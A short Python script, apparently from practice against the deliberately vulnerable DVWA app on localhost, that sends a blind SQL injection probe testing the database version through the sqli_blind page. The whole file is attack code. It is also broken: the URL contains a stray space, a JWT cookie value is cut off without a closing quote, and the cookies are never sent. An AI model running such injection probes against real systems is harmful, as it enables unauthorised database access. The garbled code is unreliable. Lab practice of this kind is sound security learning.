import requests
import urllib.parse

URL='http:// localhost:4444/vulnerabilities/sqli_blind/?id=%s&Submit=Submit'

cookies={
    'language':'en',
    'PHPSESSID':'1smr2cbr9j9ji81gg6ajvjjbs4',
    'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUZI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJ1bWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdi YmQ3MzI1MD
    'security':'low',
    'continueCode':'KQabVVENkBvjq902xgyoWrXb45wGnmTxdaL8m1pzY1PQKJMZ6D37neRqyn3x',
}

query="' AND SUBSTRING(version(),1,1)='1'#"
query= urllib.parse.quote_plus(query)

r=requests.get(URL%query)
print(r.text)
print(r.status_code)
        
